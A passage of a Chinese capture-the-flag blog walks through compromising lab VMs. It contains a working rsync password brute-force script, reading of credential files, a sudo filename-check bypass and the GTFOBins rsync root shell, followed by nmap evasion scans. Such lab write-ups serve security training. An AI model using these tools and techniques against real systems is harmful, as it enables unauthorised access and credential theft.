import Pool, Manager, cpu_count, RLock\nimport signal\nfrom functools import partial\nfrom tqdm import tqdm\n\nTARGET_HOST = '192.168.205.136'\nTARGET_PORT = '873'\nTARGET_MODULE = 'epages'\nWORDLIST_PATH = '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt'\nUSERNAMES = ['', 'sabulaji']\nRSYNC_TIMEOUT = 10\ntry:\n    NUM_PROCESSES = cpu_count() if cpu_count() <= 8 else 8\nexcept NotImplementedError:\n    NUM_PROCESSES = 4\n\ng_found_credential = None\ng_pool = None\n\n\ndef signal_handler(sig, frame):\n    global g_pool\n    print('\\n[!] CTRL+C pressed. Exiting.')\n    if g_pool:\n        g_pool.terminate()\n        g_pool.join()\n    sys.exit(1)\n\n\ndef check_password(password, found_flag, usernames):\n    if found_flag.is_set():\n        return None\n\n    for username in usernames:\n        if found_flag.is_set():\n            return None\n\n        user_part = f'{username}@' if username else ''\n        target_url = f'rsync://{user_part}{TARGET_HOST}:{TARGET_PORT}/{TARGET_MODULE}'\n\n        env = os.environ.copy()\n        env['RSYNC_PASSWORD'] = password\n\n        command = ['rsync', '--list-only', '-q', target_url]\n\n        try:\n            result = subprocess.run(\n                command,\n                env=env,\n                capture_output=True,\n                text=True,\n                timeout=RSYNC_TIMEOUT\n            )\n\n            if result.returncode == 0:\n                if not found_flag.is_set():\n                    found_flag.set()\n                    return (username, password)\n\n        except (subprocess.TimeoutExpired, Exception):\n            continue\n\n    return None\n\n\ndef main():\n    global g_found_credential, g_pool\n\n    signal.signal(signal.SIGINT, signal_handler)\n    tqdm.set_lock(RLock())\n\n    if not os.path.exists(WORDLIST_PATH):\n        print('[-] Wordlist not found.')\n        sys.exit(1)\n\n    try:\n        with open(WORDLIST_PATH, 'r', encoding='latin-1', errors='ignore') as f:\n            passwords = [line.strip() for line in f]\n    except Exception as e:\n        print(f'[-] Error reading wordlist: {e}')\n        sys.exit(1)\n\n    if not passwords:\n        print('[-] Wordlist is empty.')\n        sys.exit(1)\n\n    total_passwords = len(passwords)\n    print(f'[+] Starting rsync brute-force attack...')\n\n    with Manager() as manager:\n        found_flag = manager.Event()\n\n        with Pool(processes=NUM_PROCESSES, initializer=tqdm.set_lock, initargs=(tqdm.get_lock(),)) as pool:\n            g_pool = pool\n            worker_func = partial(check_password, found_flag=found_flag, usernames=USERNAMES)\n\n            try:\n                with tqdm(total=total_passwords, unit=' passwords', dynamic_ncols=True) as pbar:\n                    for result in pool.imap_unordered(worker_func, passwords):\n                        pbar.update(1)\n                        if result is not None:\n                            g_found_credential = result\n                            pool.terminate()\n                            break\n            finally:\n                pool.join()\n\n    print('\\n' + '=' * 60)\n    if g_found_credential:\n        found_user, found_pass = g_found_credential\n        display_user = found_user if found_user else '<empty>'\n        print(f'[+] SUCCESS! Credentials found:')\n        print(f'    Username: {display_user}')\n        print(f'    Password: {found_pass}')\n    else:\n        print('[-] FAILED. No valid credentials found.')\n    print('=' * 60)\n\n\nif __name__ == '__main__':\n    main()\n   \n```\n\n\u5c0f\u77e5\u8bc6\uff0c[[Sublarge](https://hackmyvm.eu/profile/?user=Sublarge)](https://hackmyvm.eu/profile/?user=Sublarge)\u5f88\u559c\u6b22\u4f7f\u7528xato-net-10-million-passwords-100000.txt\u8fd9\u4e2a\u5b57\u5178\uff0c\u5f00\u7206\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ python3 $_               \n[+] Starting rsync brute-force attack...\n 16%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258a                                                                                                           | 15589/100000 [06:55<37:30, 37.51 passwords/s]\n\n============================================================\n[+] SUCCESS! Credentials found:\n    Username: sabulaji\n    Password: admin123\n============================================================\n                                                                    \n```\n\n\u62f7\u4e0b\u6765\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ rsync -avz rsync://sabulaji@192.168.205.136:873/epages/ ./tmp/epages/\n\nPassword: \nreceiving incremental file list\ncreated directory ./tmp/epages\n./\nsecrets.doc\n\nsent 46 bytes  received 3,242 bytes  1,315.20 bytes/sec\ntotal size is 13,312  speedup is 4.05\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd tmp/epages \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/tmp/epages]\n\u2514\u2500$ ls -al\ntotal 13\ndrwxr-xr-x 1 kali kali     0 Jun 11 21:08 .\ndrwxr-xr-x 1 kali kali     0 Jun 11 21:08 ..\n-rwxr-xr-x 1 kali kali 13312 May 15 12:17 secrets.doc\n \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/tmp/epages]\n\u2514\u2500$ libreoffice secrets.doc \n```\n\n```\nThe Art of Keeping Secrets\nIn a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded caf\u00e9, the allure of hidden knowledge captivates us all.\nTake, for example, the old server room in my office. It\u2019s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account 'welcome.' I overheard a colleague chuckle about it, saying the password was something absurdly simple, like 'P@ssw0rd123!'\u2014hardly a secret worth keeping, but it\u2019s been untouched for years.\nSecrets, however, aren\u2019t just about passwords or hidden files. They\u2019re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.\nSo, how do we master this art? First, blend in. Don\u2019t make your secret obvious. Second, protect it with something stronger than 'P@ssw0rd123!'\u2014maybe a phrase only you\u2019d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you\u2019re not careful.\nIn the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.\n\n\u7ffb\u8bd1\n\u4fdd\u5b88\u79d8\u5bc6\u7684\u827a\u672f\n\u5728\u8fd9\u4e2a\u4fe1\u606f\u6cdb\u6ee5\u7684\u4e16\u754c\u91cc\uff0c\u4fdd\u5b88\u79d8\u5bc6\u65e2\u662f\u4e00\u95e8\u827a\u672f\uff0c\u4e5f\u662f\u4e00\u9879\u6311\u6218\u3002\u65e0\u8bba\u662f\u85cf\u5728\u5e8a\u57ab\u4e0b\u7684\u79c1\u4eba\u65e5\u8bb0\uff0c\u8fd8\u662f\u5728\u62e5\u6324\u7684\u5496\u5561\u9986\u91cc\u4f20\u9012\u7684\u795e\u79d8\u4fe1\u606f\uff0c\u9690\u85cf\u77e5\u8bc6\u7684\u9b45\u529b\u90fd\u6df1\u6df1\u5438\u5f15\u7740\u6211\u4eec\u3002\n\u5c31\u62ff\u6211\u529e\u516c\u5ba4\u91cc\u7684\u8001\u670d\u52a1\u5668\u673a\u623f\u6765\u8bf4\u5427\u3002\u90a3\u662f\u4e00\u4e2a\u5e03\u6ee1\u7070\u5c18\u7684\u89d2\u843d\uff0c\u4e00\u4e9b\u88ab\u9057\u5fd8\u7684\u673a\u5668\u9759\u9759\u5730\u55e1\u55e1\u4f5c\u54cd\u3002\u5176\u4e2d\u4e00\u53f0\u662f21\u4e16\u7eaa\u521d\u7684\u9057\u7269\uff0c\u81f3\u4eca\u4ecd\u5728\u8fd0\u884cFTP\u670d\u52a1\u3002\u7ba1\u7406\u5458\u4e00\u65f6\u7cca\u6d82\uff0c\u628a\u9ed8\u8ba4\u8d26\u6237\u547d\u540d\u4e3a\u201cwelcome\u201d\u3002\u6211\u65e0\u610f\u4e2d\u542c\u5230\u4e00\u4f4d\u540c\u4e8b\u5bf9\u6b64\u7a83\u7b11\uff0c\u8bf4\u5bc6\u7801\u7b80\u5355\u5f97\u53ef\u7b11\uff0c\u6bd4\u5982\u201cP@ssw0rd123\uff01\u201d\u2014\u2014\u8fd9\u7b97\u4e0d\u4e0a\u4ec0\u4e48\u503c\u5f97\u4fdd\u5b88\u7684\u79d8\u5bc6\uff0c\u4f46\u591a\u5e74\u6765\u5374\u4ece\u672a\u88ab\u89e6\u78b0\u8fc7\u3002\n\u7136\u800c\uff0c\u79d8\u5bc6\u4e0d\u4ec5\u4ec5\u5173\u4e4e\u5bc6\u7801\u6216\u9690\u85cf\u6587\u4ef6\u3002\u5b83\u5173\u4e4e\u610f\u56fe\u3002\u5173\u4e8e\u9879\u76ee\u7684\u6084\u6084\u6d41\u8a00\uff0c\u670b\u53cb\u4e4b\u95f4\u6697\u4e2d\u4e00\u77a5\uff0c\u751a\u81f3\u662f\u6211\u4eec\u5b88\u62a4\u601d\u60f3\u7684\u65b9\u5f0f\u3002\u6700\u597d\u7684\u79d8\u5bc6\u662f\u90a3\u4e9b\u85cf\u5728\u4f17\u76ee\u777d\u777d\u4e4b\u4e0b\uff0c\u4e0d\u88ab\u5206\u5fc3\u4e4b\u773c\u5bdf\u89c9\u7684\u79d8\u5bc6\u3002\n\u90a3\u4e48\uff0c\u6211\u4eec\u5982\u4f55\u638c\u63e1\u8fd9\u95e8\u827a\u672f\u5462\uff1f\u9996\u5148\uff0c\u878d\u5165\u5176\u4e2d\u3002\u4e0d\u8981\u8ba9\u4f60\u7684\u79d8\u5bc6\u663e\u800c\u6613\u89c1\u3002\u5176\u6b21\uff0c\u7528\u6bd4\u201cP@ssw0rd123\uff01\u201d\u66f4\u5f3a\u786c\u7684\u8bed\u6c14\u6765\u4fdd\u62a4\u5b83\u2014\u2014\u4e5f\u8bb8\u8fd9\u53e5\u8bdd\u53ea\u6709\u4f60\u81ea\u5df1\u624d\u80fd\u7406\u89e3\u3002\u6700\u540e\uff0c\u8c28\u614e\u4fe1\u4efb\u3002\u5373\u4f7f\u662f\u6700\u53cb\u5584\u7684\u7cfb\u7edf\uff0c\u5982\u679c\u4f60\u4e0d\u5c0f\u5fc3\uff0c\u4e5f\u53ef\u80fd\u80cc\u53db\u4f60\u3002\n\u6700\u7ec8\uff0c\u79d8\u5bc6\u63d0\u9192\u6211\u4eec\uff0c\u5e76\u975e\u6240\u6709\u4e8b\u60c5\u90fd\u9700\u8981\u5206\u4eab\u3002\u6709\u4e9b\u4e8b\u60c5\u6700\u597d\u4e0d\u8981\u8bf4\uff0c\u6216\u8005\u81f3\u5c11\u7559\u7ed9\u90a3\u4e9b\u77e5\u9053\u53bb\u54ea\u91cc\u627e\u7684\u4eba\u3002\n```\n\nwelcome:P@ssw0rd123!\n\n\u767b\u5f55ssh\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/tmp/epages]\n\u2514\u2500$ ssh welcome@192.168.205.136\nThe authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:5: [hashed name]\n    ~/.ssh/known_hosts:9: [hashed name]\n    ~/.ssh/known_hosts:10: [hashed name]\n    ~/.ssh/known_hosts:11: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\n    ~/.ssh/known_hosts:13: [hashed name]\n    ~/.ssh/known_hosts:14: [hashed name]\n    ~/.ssh/known_hosts:15: [hashed name]\n    (4 additional names omitted)\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.\nwelcome@192.168.205.136's password: \nPermission denied, please try again.\nwelcome@192.168.205.136's password: \nLinux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nwelcome@Sabulaji:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)\n```\n\n\u6252\u62c9\n\n```\nwelcome@Sabulaji:~$ ls -la\ntotal 24\ndrwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .\ndrwxr-xr-x 4 root    root    4096 May 15 12:39 ..\nlrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -> /dev/null\n-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout\n-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc\n-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile\n-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt\nwelcome@Sabulaji:~$ cat user.txt \nflag{user-cf7883184194add6adfa5f20b5061ac7}\nwelcome@Sabulaji:~$ sudo -l\nMatching Defaults entries for welcome on Sabulaji:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Sabulaji:\n    (sabulaji) NOPASSWD: /opt/sync.sh\nwelcome@Sabulaji:~$ cat /opt/sync.sh\n#!/bin/bash\n\nif [ -z $1 ]; then\n    echo 'error: note missing'\n    exit\nfi\n\nnote=$1\n\nif [[ '$note' == *'sabulaji'* ]]; then\n    echo 'error: forbidden'\n    exit\nfi\n\ndifference=$(diff /home/sabulaji/personal/notes.txt $note)\n\nif [ -z '$difference' ]; then\n    echo 'no update'\n    exit\nfi\n\necho 'Difference: $difference'\n\ncp $note /home/sabulaji/personal/notes.txt\n\necho '[+] Updated.'\n```\n\n\u5b9e\u73b0\u53c2\u6570\u4e2d\u4e0d\u80fd\u5305\u542b'sabulaji'\uff0c\u7136\u540e\u4f7f\u7528diff \u547d\u4ee4\u6bd4\u8f83\u76ee\u6807\u6587\u4ef6 /home/sabulaji/personal/notes.txt \u548c\u8f93\u5165\u7684 note \u6587\u4ef6\u4e4b\u95f4\u7684\u5dee\u5f02,\u8f93\u5165note\u4e3a$1\n\n\u5148\u770b\u770b\u5b83\u4e00\u5f00\u59cb\u653e\u4e86\u4ec0\u4e48\n\n```\nwelcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /dev/null\nDifference: 1d0\n< Maybe you can find it...\n[+] Updated.\n```\n\n![image-20250612091547195](https://7r1umphk.github.io/image/202506120915456.webp)\n\n\u4e0d\uff0c\u6211\u627e\u4e0d\u5230(\u624b\u52a8\u72d7\u5934doge)\n\n```\nwelcome@Sabulaji:~$ cd /tmp/\nwelcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd\nDifference: 0a1,27\n> root:x:0:0:root:/root:/bin/bash\n> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n> bin:x:2:2:bin:/bin:/usr/sbin/nologin\n> sys:x:3:3:sys:/dev:/usr/sbin/nologin\n> sync:x:4:65534:sync:/bin:/bin/sync\n> games:x:5:60:games:/usr/games:/usr/sbin/nologin\n> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin\n> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n> welcome:x:1000:1000:,,,:/home/welcome:/bin/bash\n> sabulaji:x:1001:1001::/home/sabulaji:/bin/bash\n[+] Updated.\nwelcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/shadow\ndiff: /etc/shadow: Permission denied\nno update\n```\n\n\u6252\u62c9\u4e86\u5f88\u4e45\uff0c\u7136\u540e\u6211\u5076\u7136\u95f4id\u4e86\u4e00\u4e0b\n\n```\nwelcome@Sabulaji:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)\n```\n\n\u5b83\u6bd4\u6b63\u5e38\u7684\u591a\u4e86\u4e00\u4e2amlocate\u7684\u7ec4\uff0c\u7136\u540e\u6211\u5c31\u53bb\u6252\u62c9\u8fd9\u4e2a\u662f\u5e72\u4ec0\u4e48\u7684\n![image-20250612094149243](https://7r1umphk.github.io/image/202506120941472.webp)\n\n\u554a\u8fd9\uff0c\u90a3\u6211\u77e5\u9053\u4e86\n\n```\nwelcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | less\n```\n\n\u7136\u540e\u641c\u7d22sabulaji\n\n![image-20250612094040790](https://7r1umphk.github.io/image/202506120940995.webp)\n\n\u770b\u770b\u662f\u4e0d\u662f\u8fd9\u4e2a\n\n```\nwelcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/creds.txt\nerror: forbidden\n```\n\n\u5728\u8fd9\u7b49\u6211\u5462\n\n```\nwelcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt\nDifference: 1c1\n< \n---\n> Sensitive Credentials:Z2FzcGFyaW4=\n[+] Updated.\n```\n\n\u62ff\u4e0b\n\n```\nwelcome@Sabulaji:/tmp$ cd /home/\nwelcome@Sabulaji:/home$ su sabulaji\nPassword: \nsabulaji@Sabulaji:/home$ id\nuid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)\n```\n\n\u6252\u62c9\n\n```\nsabulaji@Sabulaji:/home$ cd sabulaji/\nsabulaji@Sabulaji:~$ ls -al\ntotal 24\ndrwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .\ndrwxr-xr-x 4 root     root     4096 May 15 12:39 ..\nlrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -> /dev/null\n-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc\ndrwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal\n-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile\nsabulaji@Sabulaji:~$ cd personal/\nsabulaji@Sabulaji:~/personal$ ls -al\ntotal 16\ndrwx------ 2 sabulaji sabulaji 4096 May 16 01:33 .\ndrwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 ..\n-r-------- 1 sabulaji sabulaji   35 May 16 01:32 creds.txt\n-rw-r--r-- 1 sabulaji sabulaji   35 Jun 11 21:56 notes.txt\nsabulaji@Sabulaji:~/personal$ sudo -l\nMatching Defaults entries for sabulaji on Sabulaji:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sabulaji may run the following commands on Sabulaji:\n    (ALL) NOPASSWD: /usr/bin/rsync\n```\n\n\u6709\u73b0\u6210\u7684\n\nhttps://gtfobins.github.io/gtfobins/rsync/#sudo\n\n```\nsabulaji@Sabulaji:~/personal$ sudo rsync -e 'sh -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# bash           \nroot@Sabulaji:/home/sabulaji/personal# cat /root/root.txt \nflag{root-89e62d8807f7986edb259eb2237d011c}\n```sentence", "top": 0, "createdAt": 1751016539, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P29": {"htmlDir": "docs/post/VulnHub Death Star- 1 -shen-tou-ce-shi-bao-gao.html", "labels": ["vulnhub"], "postTitle": "VulnHub Death Star- 1 \u6e17\u900f\u6d4b\u8bd5\u62a5\u544a", "postUrl": "post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/29", "commentNum": 0, "wordCount": 19949, "description": "\u9776\u673a\u5730\u5740: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)\n\n![image-20250515144334733](https://7r1umphk.github.io/image/20250515144342235.webp)\n\n### 1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u53d1\u73b0\u9776\u673a IP \u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ sudo arp-scan -l     \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.210 08:00:27:b2:99:5a       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded\n```\n\n\u9776\u673a IP \u4e3a `192.168.205.210`\u3002\n\n\u5c1d\u8bd5\u8fdb\u884c\u5168\u7aef\u53e3\u5feb\u901f\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ nmap -p- --min-rate 10000 192.168.205.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00051s latency).\nAll 65535 scanned ports on 192.168.205.210 are in ignored states.\nNot shown: 65535 filtered tcp ports (no-response)\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.51 seconds\n```\n\n\u6ca1\u6709\u626b\u63cf\u5230\u5f00\u653e\u7aef\u53e3\uff0c\u6240\u6709\u7aef\u53e3\u72b6\u6001\u4e3a `ignored` \u6216 `filtered`\u3002\n\u786e\u8ba4\u4e3b\u673a\u662f\u5426\u8fde\u901a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ ping 192.168.205.210\nPING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.\n64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms\n...\n--- 192.168.205.210 ping statistics ---\n11 packets transmitted, 11 received, 0% packet loss, time 10231ms\nrtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms\n```\n\n\u4e3b\u673a\u662f\u8fde\u901a\u7684\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u6709\u9632\u706b\u5899\u8fc7\u6ee4\u4e86 TCP \u7aef\u53e3\u626b\u63cf\u3002\n\n\u5c1d\u8bd5\u4f7f\u7528 `-Pn` (\u8df3\u8fc7\u4e3b\u673a\u53d1\u73b0) \u548c\u5176\u4ed6\u626b\u63cf\u6280\u672f\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00038s latency).\nAll 65535 scanned ports on 192.168.205.210 are in ignored states.\nNot shown: 65535 filtered tcp ports (no-response)\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 131.46 seconds\n```\n\n\u5c1d\u8bd5 ACK \u626b\u63cf (`-sA`) \u6765\u63a2\u6d4b\u9632\u706b\u5899\u89c4\u5219\u96c6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00038s latency).\nAll 65535 scanned ports on 192.168.205.210 are in ignored states.\nNot shown: 65535 filtered tcp ports (no-response)\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 131.40 seconds\n```\n\n\u7ed3\u679c\u4f9d\u65e7\u3002\u5c1d\u8bd5 FIN, Xmas, Null \u9690\u853d\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 && \\\nsudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 && \\\nsudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210\n# ... (\u4e09\u6b21\u626b\u63cf\u7ed3\u679c\u7c7b\u4f3c\uff0c\u5747\u4e3a open|filtered \u6216 filtered)\n```\n\nTCP \u7aef\u53e3\u626b\u63cf\u4f3c\u4e4e\u90fd\u65e0\u6cd5\u7a7f\u900f\u9632\u706b\u5899\u3002\u5c1d\u8bd5 UDP \u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/bj]\n\u2514\u2500$ nmap -sU --top-ports 100 192.168.205.210                                                                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00035s latency).\nNot shown: 99 closed udp ports (port-unreach)\nPORT   STATE         SERVICE\n68/udp open|filtered dhcpc\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 103.11 seconds\n```\n\nUDP \u7aef\u53e3 68 (DHCP\u5ba2\u6237\u7aef) \u901a\u5e38\u4e0d\u662f\u53ef\u5229\u7528\u7684\u5165\u53e3\u3002\n\n\u5c1d\u8bd5\u5206\u7247\u626b\u63cf (`-f`) \u548c\u6e90\u7aef\u53e3\u4f2a\u88c5 (`-g 53`)\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210\n# ... (\u7ed3\u679c filtered)\n                                                                      \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210\n# ... (\u7ed3\u679c filtered)\n```\n\n\u6240\u6709 TCP \u626b\u63cf\u5c1d\u8bd5\u5747\u5931\u8d25\uff0c\u770b\u6765\u9700\u8981\u53e6\u8f9f\u8e4a\u5f84\u3002\n\n### 2. \u6d41\u91cf\u6355\u83b7\u4e0e\u4fe1\u606f\u83b7\u53d6\n\n\u65e2\u7136\u4e3b\u52a8\u626b\u63cf\u6548\u679c\u4e0d\u4f73\uff0c\u5c1d\u8bd5\u6355\u83b7\u9776\u673a\u53d1\u51fa\u7684\u6d41\u91cf\uff0c\u770b\u662f\u5426\u6709\u7ebf\u7d22\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n03:12:01.447736 IP 192.168.205.210.44226 > 255.255.255.255.160: UDP, length 472\n03:12:01.447804 IP 192.168.205.210.44226 > 255.255.255.255.160: UDP, length 472\n03:12:01.448295 IP 192.168.205.210.53472 > 255.255.255.255.357: UDP, length 97\n03:12:01.448342 IP 192.168.205.210.53472 > 255.255.255.255.357: UDP, length 97\n03:12:20.192762 IP 192.168.205.210.68 > 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300\n03:12:20.192956 IP 192.168.205.254.67 > 192.168.205.210.68: BOOTP/DHCP, Reply, length 300\n^C\n6 packets captured\n6 packets received by filter\n0 packets dropped by kernel\n```\n\n\u53d1\u73b0\u9776\u673a\u5411\u5e7f\u64ad\u5730\u5740\u7684 UDP \u7aef\u53e3 160 \u548c 357 \u53d1\u9001\u6570\u636e\u3002\u4f7f\u7528 `nc` \u76d1\u542c\u8fd9\u4e24\u4e2a\u7aef\u53e3\uff1a\n\n\u76d1\u542c UDP 160 